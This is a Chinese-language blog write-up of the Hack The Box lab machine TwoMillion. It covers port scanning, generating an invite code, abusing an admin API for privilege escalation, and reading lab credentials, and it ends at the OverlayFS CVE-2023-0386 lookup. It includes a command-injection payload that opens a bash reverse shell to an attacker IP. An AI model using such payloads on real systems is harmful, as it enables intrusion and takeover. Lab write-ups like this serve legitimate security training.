<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>TwoMillion(HTB) · zIxyd's Blog</title><meta name="description" content="信息搜集nmap1234567891011121314151617181920212223242526272829303132333435┌──(kali㉿kali)-[~]└─$ sudo nmap -p- -min-rate 10000 10.10.11.221[sudo] kali 的密码：S"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">信息搜集</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#nmap"><span class="toclist-text">nmap</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E7%9B%AE%E5%BD%95%E5%92%8C%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toclist-text">目录和子域名</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#www-data"><span class="toclist-text">www-data</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E9%82%80%E8%AF%B7%E7%A0%81"><span class="toclist-text">邀请码</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E8%8E%B7%E5%BE%97%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="toclist-text">获得管理员权限</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toclist-text">命令注入</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-admin"><span class="toclist-text">user_admin</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-root"><span class="toclist-text">user_root</span></a></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>存放个人学习笔记的小窝，欢迎交流</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">信息搜集</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#nmap"><span class="toclist-text">nmap</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E7%9B%AE%E5%BD%95%E5%92%8C%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toclist-text">目录和子域名</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#www-data"><span class="toclist-text">www-data</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E9%82%80%E8%AF%B7%E7%A0%81"><span class="toclist-text">邀请码</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E8%8E%B7%E5%BE%97%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="toclist-text">获得管理员权限</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toclist-text">命令注入</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-admin"><span class="toclist-text">user_admin</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#user-root"><span class="toclist-text">user_root</span></a></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>TwoMillion(HTB)</a></h3></div><div class="post-content"><p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- -min-rate 10000 10.10.11.221</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-26 16:03 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 2million.htb (10.10.11.221)</span><br><span class="line">Host is up (0.078s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">                                                                                                           </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sT -sV -sC -O -p80,22 10.10.11.221</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-26 16:03 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 2million.htb (10.10.11.221)</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span><br><span class="line">80/tcp open  http    nginx</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">|_http-title: Hack The Box :: Penetration Testing Labs</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="目录和子域名"><a href="#目录和子域名" class="headerlink" title="目录和子域名"></a>目录和子域名</h3><p>扫描无果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dirsearch -u http://2million.htb</span><br></pre></td></tr></table></figure>

<p>从nmap扫描的信息得到主域名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;10.10.11.221 2million.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<h2 id="www-data"><a href="#www-data" class="headerlink" title="www-data"></a>www-data</h2><h3 id="邀请码"><a href="#邀请码" class="headerlink" title="邀请码"></a>邀请码</h3><p>点击join会重定向到<code>/invite</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126161014.png"></p>
<p>要求输入邀请码</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126161127.png"></p>
<p>注册功能也需要邀请码才能注册</p>
<p><code>F12</code>在<code>invite</code>页面中会发现一个名为<code>inviteapi.min.js</code>的js文件，内容如下：</p>
<p>即使做了js混淆，也可以明显看到<code>verifyInviteCode</code>和<code>makeInviteCode</code>函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)&#123;e=<span class="keyword">function</span>(<span class="params">c</span>)&#123;<span class="keyword">return</span> c.<span class="title function_">toString</span>(<span class="number">36</span>)&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>.<span class="title function_">replace</span>(<span class="regexp">/^/</span>,<span class="title class_">String</span>))&#123;<span class="keyword">while</span>(c--)&#123;d[c.<span class="title function_">toString</span>(a)]=k[c]||c.<span class="title function_">toString</span>(a)&#125;k=[<span class="keyword">function</span>(<span class="params">e</span>)&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span><span class="string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)&#123;<span class="keyword">if</span>(k[c])&#123;p=p.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\\b&#x27;</span>+<span class="title function_">e</span>(c)+<span class="string">&#x27;\\b&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),k[c])&#125;&#125;<span class="keyword">return</span> p&#125;(<span class="string">&#x27;1 i(4)&#123;h 8=&#123;&quot;4&quot;:4&#125;;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#x27;/d/e/n\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;1 j()&#123;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,b:\&#x27;/d/e/k/l/m\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;&#x27;</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="string">&#x27;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;|&#x27;</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure>

<p>尝试在控制台中执行”inviteapi.min.js”文件中的<code>makeInviteCode</code>函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126161548.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object &#123; data: &quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&quot;, enctype: &quot;ROT13&quot; &#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://rot13.com/">rot13</a>在线解密得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In order to generate the invite code, make a POST request to /api/v1/invite/generate</span><br></pre></td></tr></table></figure>

<p>POST请求，在base64解密，成功得到邀请码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl -X POST http://2million.htb/api/v1/invite/generate</span><br><span class="line">&#123;<span class="string">&quot;0&quot;</span>:200,<span class="string">&quot;success&quot;</span>:1,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;SUFGNE4tN1FHSVEtN0o3WUYtUThBVjA=&quot;</span>,<span class="string">&quot;format&quot;</span>:<span class="string">&quot;encoded&quot;</span>&#125;&#125; </span><br><span class="line"></span><br><span class="line">(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&quot;SUFGNE4tN1FHSVEtN0o3WUYtUThBVjA=&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">IAF4N-7QGIQ-7J7YF-Q8AV0 </span><br></pre></td></tr></table></figure>

<p>在<code>/invite</code>输入邀请码会重定向到<code>/register</code>，并且邀请码填充到了里面；</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126162123.png"></p>
<p>随意注册一个账号，并登录</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126162514.png"></p>
<h3 id="获得管理员权限"><a href="#获得管理员权限" class="headerlink" title="获得管理员权限"></a>获得管理员权限</h3><p><code>/home/access</code>点击”Connection Pack”抓包，发现一个下载ovpn文件的api；</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126162715.png"></p>
<p>api漏洞常规测试：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/user/vpn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">GET /api/v1/user HTTP/1.1</span><br><span class="line">GET /api/v1 HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>发现<code>/api/v1</code>有内容；内容是所有的api接口以及接口的作用</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126163004.png"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;v1&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;GET&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1&quot;</span><span class="punctuation">:</span><span class="string">&quot;Route List&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/invite\/how\/to\/generate&quot;</span><span class="punctuation">:</span><span class="string">&quot;Instructions on invite code generation&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/invite\/generate&quot;</span><span class="punctuation">:</span><span class="string">&quot;Generate invite code&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/invite\/verify&quot;</span><span class="punctuation">:</span><span class="string">&quot;Verify invite code&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/user\/auth&quot;</span><span class="punctuation">:</span><span class="string">&quot;Check if user is authenticated&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/user\/vpn\/generate&quot;</span><span class="punctuation">:</span><span class="string">&quot;Generate a new VPN configuration&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/user\/vpn\/regenerate&quot;</span><span class="punctuation">:</span><span class="string">&quot;Regenerate VPN configuration&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/user\/vpn\/download&quot;</span><span class="punctuation">:</span><span class="string">&quot;Download OVPN file&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;POST&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/user\/register&quot;</span><span class="punctuation">:</span><span class="string">&quot;Register a new user&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/user\/login&quot;</span><span class="punctuation">:</span><span class="string">&quot;Login with existing user&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;GET&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/admin\/auth&quot;</span><span class="punctuation">:</span><span class="string">&quot;Check if user is admin&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;POST&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/admin\/vpn\/generate&quot;</span><span class="punctuation">:</span><span class="string">&quot;Generate VPN for specific user&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PUT&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;\/api\/v1\/admin\/settings\/update&quot;</span><span class="punctuation">:</span><span class="string">&quot;Update user settings&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>我们的账号只是普通用户；</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126163242.png"></p>
<p>返回<code>401 Unauthorized</code>,看来是没有权限</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126163334.png"></p>
<p>最终发现<code>/api/v1/admin/vpn/generate</code>API接口可以将用户帐户更改为管理员帐户</p>
<p>返回错误的数据类型</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126163503.png"></p>
<p>添加”Content-type: application&#x2F;json”，返回缺少参数 “email”</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126163639.png"></p>
<p>添加一条”email”数据，返回缺少此参数“is_admin”</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126163746.png"></p>
<p>返回“is_admin”只能为0或1</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126163906.png"></p>
<p>最终成功修改为admin账号</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126164027.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126164129.png"></p>
<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p><code>/api/v1/admin/vpn/generat</code>也是生成ovpn文件的接口；生成 VPN 密钥的可能不是 PHP 代码，而是一些生成 VPN 密钥必要信息的 Bash 工具。值得检查是否有任何命令注入。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126164902.png"></p>
<p>如果服务器正在执行类似的操作<code>gen_vpn.sh [username]</code>，那么我将尝试<code>;</code>在用户名中放入username中以将其分解为新命令。我还将<code>#</code>在末尾添加一个以注释掉我输入后可能出现的任何内容；然后发现<code>/api/v1/admin/vpn/generate</code>接口存在命令注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126164928.png"></p>
<p>反弹一个shell到攻击机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 5555</span><br></pre></td></tr></table></figure>

<p>POST请求数据如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;username&quot;:&quot;test; bash -c &#x27;bash -i &gt;&amp;  /dev/tcp/10.10.16.17/5555 0&gt;&amp;1&#x27;;#&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功反弹shell后,存在一个admin用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@2million:~/html$ <span class="built_in">ls</span> -l /home</span><br><span class="line">drwxr-xr-x 6 admin admin 4096 Jan 26 07:50 admin</span><br></pre></td></tr></table></figure>

<p>在web应用默认目录下的<code>.env</code>文件中发现用户admin的数据库密码，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">w-data@2million:~/html$ <span class="built_in">cat</span> .<span class="built_in">env</span></span><br><span class="line"><span class="built_in">cat</span> .<span class="built_in">env</span></span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_DATABASE=htb_prod</span><br><span class="line">DB_USERNAME=admin</span><br><span class="line">DB_PASSWORD=SuperDuperPass123</span><br></pre></td></tr></table></figure>

<p>伪终端，连接数据库，在数据库中并没有找到可利用的信息，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p>尝试利用数据库密码连接admin的ssh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh admin@10.10.11.221</span><br><span class="line">password:SuperDuperPass123</span><br></pre></td></tr></table></figure>

<h2 id="user-admin"><a href="#user-admin" class="headerlink" title="user_admin"></a>user_admin</h2><p>ssh连接成功，但是在连接ssh的时候，有这样一些信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You have mail.</span><br><span class="line">Last login: Fri Jan 26 08:53:41 2024 from 10.10.14.6</span><br></pre></td></tr></table></figure>

<p>利用find命令查找有关’mail’的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin@2million:~$ find / -name <span class="string">&quot;mail&quot;</span> 2&gt;/dev/null</span><br><span class="line">/snap/core20/1891/var/mail</span><br><span class="line">/snap/core20/1891/var/spool/mail</span><br><span class="line">/var/spool/mail</span><br><span class="line">/var/mail</span><br><span class="line">/usr/lib/python3/dist-packages/twisted/mail</span><br><span class="line">/usr/lib/byobu/mail</span><br></pre></td></tr></table></figure>

<p>根据每个目录的作用，基本可以确定在’&#x2F;var’目录下</p>
<p>从中有一些关键词<code>OverlayFS / FUSE</code>说明这台机器的内核会受到影响</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">admin@2million:~$ <span class="built_in">cat</span> /var/mail/admin </span><br><span class="line">From: ch4p &lt;ch4p@2million.htb&gt;</span><br><span class="line">To: admin &lt;admin@2million.htb&gt;</span><br><span class="line">Cc: g0blin &lt;g0blin@2million.htb&gt;</span><br><span class="line">Subject: Urgent: Patch System OS</span><br><span class="line">Date: Tue, 1 June 2023 10:45:22 -0700</span><br><span class="line">Message-ID: &lt;9876543210@2million.htb&gt;</span><br><span class="line">X-Mailer: ThunderMail Pro 5.2</span><br><span class="line"></span><br><span class="line">Hey admin,</span><br><span class="line"></span><br><span class="line">I<span class="string">&#x27;m know you&#x27;</span>re working as fast as you can to <span class="keyword">do</span> the DB migration. While we<span class="string">&#x27;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#x27;</span>t get popped by that.</span><br><span class="line"></span><br><span class="line">HTB Godfather</span><br></pre></td></tr></table></figure>

<h2 id="user-root"><a href="#user-root" class="headerlink" title="user_root"></a>user_root</h2><p>我只是把关键词放到google；后面一些内容已经暴露了 一些exploit</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240126170436.png"></p>
<p>其中排在google第一个的就是<a target="_blank" rel="noopener" href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">cve-2023-0386</a>,文章中表明：如果系统的内核版本低于 6.2，则该系统可能容易受到攻击。</p>
